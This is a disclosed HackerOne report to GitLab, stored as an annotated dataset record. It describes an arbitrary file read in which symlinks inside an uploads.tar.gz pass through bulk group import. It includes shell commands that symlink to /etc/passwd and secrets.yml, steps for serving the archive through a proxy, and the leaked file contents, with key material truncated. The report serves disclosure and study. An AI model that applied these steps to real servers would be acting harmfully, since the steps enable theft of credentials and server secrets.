{
  "reported_to": "GitLab",
  "reported_by": "vakzz ",
  "title": "Arbitrary file read  via the bulk imports UploadsPipeline",
  "content": "\nSummary\nThe bulk imports api does not remove symlinks when untaring the uploads.tar.gz file, allowing arbitrary files to be read and uploaded when importing a group.\nWhen a group has uploads (such as markdown attachments), an uploads.tar.gz file will be downloaded and extracted in the UploadsPipeline:\nhttps://gitlab.com/gitlab-org/gitlab/-/blob/v14.6.0-ee/lib/bulk_imports/common/pipelines/uploads_pipeline.rb#L15\nCode 312 Bytes\n1       def extract(context)\n2          download_service(tmp_dir, context).execute\n3          untar_zxf(archive: File.join(tmp_dir, FILENAME), dir: tmp_dir)\n4          upload_file_paths = Dir.glob(File.join(tmp_dir, '**', '*'))\n5\n6          BulkImports::Pipeline::ExtractedData.new(data: upload_file_paths)\n7        end\nSince untar_zxf only changes the permissions, any symlinks that are extracted from the tar will remain and be added to the list of file paths. When load is called, the symlinks will be followed and used as the content for the new file:\nhttps://gitlab.com/gitlab-org/gitlab/-/blob/v14.6.0-ee/lib/bulk_imports/common/pipelines/uploads_pipeline.rb#L23\nCode 503 Bytes\n1        def load(context, file_path)\n2          avatar_path = AVATAR_PATTERN.match(file_path)\n3\n4          return save_avatar(file_path) if avatar_path\n5\n6          dynamic_path = file_uploader.extract_dynamic_path(file_path)\n7\n8          return unless dynamic_path\n9          return if File.directory?(file_path)\n10\n11          named_captures = dynamic_path.named_captures.symbolize_keys\n12\n13          UploadService.new(context.portable, File.open(file_path, 'r'), file_uploader, **named_captures).execute\n14        end\nThis can be used to read any file that the git user has read access to such as secrets.yml or other sensitive files.\nSteps to reproduce\nCreate a new group on gitlab.com\nCreate a new milestone and upload a file passwd with any content into the description\nMake note of the upload secret (the 32 byte hash in the path)\nmkdir ./d3209c811fee407218bff7cb3b4333e6\nln -s /etc/passwd ./d3209c811fee407218bff7cb3b4333e6/passwd\nln -s /srv/gitlab/config/secrets.yml ./d3209c811fee407218bff7cb3b4333e6/secrets.yml\ntar cvzf uploads.tar.gz ./d3209c811fee407218bff7cb3b4333e6\n\nSave the following simple proxy server as api.py and run it with FLASK_APP=api flask run, this will replace the uploads.tar.gz with a custom one: api.py (F1565789)\nStart ngrok so that it's externally accessible: ngrok http 5000\nCreate a new access token at https://gitlab.com/-/profile/personal_access_tokens\nCreate a new group, this time choose import group\nEnter the https ngrok url and the token you just created\nSelect the group you initially created and choose a new name\nOnce the import has complete, view the milestone and click the passwd link\nYou will see the passwd file from the gitlab server\nCopy the link and change passwd to secrets.yml and you should be able to download the secrets file\nImpact\nA user with access to import a group on gitlab can read arbitrary files on the gitlab server\nExamples\nExample with passwd and secrets.yml attached:\nhttps://gitlab.com/groups/group_to_import_1/-/milestones/1\nhttps://gitlab.com/groups/group_to_import_1/-/uploads/d3209c811fee407218bff7cb3b4333e6/passwd\nhttps://gitlab.com/groups/group_to_import_1/-/uploads/d3209c811fee407218bff7cb3b4333e6/secrets.yml\nWhat is the current bug behavior?\nSymlinks are not removed or filtered when the UploadsPipeline is run for the bulk imports api\nWhat is the expected correct behavior?\nSymlinks should be removed similar to the project import\nRelevant logs and/or screenshots\n/etc/passwd file:\nCode 971 Bytes\n1root:x:0:0:root:/root:/bin/bash\n2daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\n3bin:x:2:2:bin:/bin:/usr/sbin/nologin\n4sys:x:3:3:sys:/dev:/usr/sbin/nologin\n5sync:x:4:65534:sync:/bin:/bin/sync\n6games:x:5:60:games:/usr/games:/usr/sbin/nologin\n7man:x:6:12:man:/var/cache/man:/usr/sbin/nologin\n8lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin\n9mail:x:8:8:mail:/var/mail:/usr/sbin/nologin\n10news:x:9:9:news:/var/spool/news:/usr/sbin/nologin\n11uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin\n12proxy:x:13:13:proxy:/bin:/usr/sbin/nologin\n13www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\n14backup:x:34:34:backup:/var/backups:/usr/sbin/nologin\n15list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin\n16irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin\n17gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin\n18nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin\n19_apt:x:100:65534::/nonexistent:/usr/sbin/nologin\n20git:x:1000:1000:GitLab,,,:/home/git:/bin/bash\n/srv/gitlab/config/secrets.yml file:\nCode 583 Bytes\n1production:\n2  secret_key_base: 1174116b6adee.....\n3  otp_key_base: staging-a680efdeb2e93751f32.....\n4  db_key_base: 1174116b6adee59.....\n5  openid_connect_signing_key: |\n6    -----BEGIN RSA PRIVATE KEY-----\n7    MIIJKQIBAAKCAgEA5RyvCSgBoOGNE03CMcJ9.....\n8    -----END RSA PRIVATE KEY-----\n9  ci_jwt_signing_key: |\n10    -----BEGIN RSA PRIVATE KEY-----\n11    MIIEpAIBAAKCAQEAvazHHoAHZB5j9RUyq0CEK9.....\n12    -----END RSA PRIVATE KEY-----\n13\n14\n15### Output of checks\n16This bug happens on GitLab.com\n17\n18## Impact\n19\n20A user with access to import a group on gitlab can read arbitrary files on the gitlab server\n\n",
  "severity": [
    9.6,
    null
  ],
  "bounty": 29000,
  "weaknesses": [
    "Path Traversal"
  ],
  "screenshots": {},
  "disclosed_date": 1647888360,
  "report_url": "https://hackerone.com/reports/1439593",
  "is_multi_component": true,
  "complexity": "HIGH",
  "novelty": "MEDIUM",
  "vuln_category": "API",
  "steps": [
    [
      1,
      "Create a new group on GitLab and upload a file to a milestone description"
    ],
    [
      2,
      "Create symlinks to sensitive files (/etc/passwd, /srv/gitlab/config/secrets.yml) and package them into uploads.tar.gz"
    ],
    [
      3,
      "Set up a proxy server to serve the malicious uploads.tar.gz file"
    ],
    [
      4,
      "Use ngrok to expose the proxy server externally"
    ],
    [
      5,
      "Create a new access token for GitLab"
    ],
    [
      6,
      "Import the group using the ngrok URL and access token"
    ],
    [
      7,
      "Access the imported files to read sensitive server files"
    ]
  ],
  "vuln_description": "The bulk imports API in GitLab does not remove symlinks when extracting the uploads.tar.gz file, allowing an attacker to read arbitrary files on the server by including symlinks to sensitive files in the archive.",
  "reason": "The vulnerability requires understanding of the bulk import process, symlink manipulation, and setting up a proxy server to serve the malicious archive. However, the core issue (symlink following) is a well-known security pitfall.",
  "new_complexity": "MEDIUM",
  "requires_code": true,
  "requires_CVE": false,
  "is_ctf": false,
  "other_report": null
}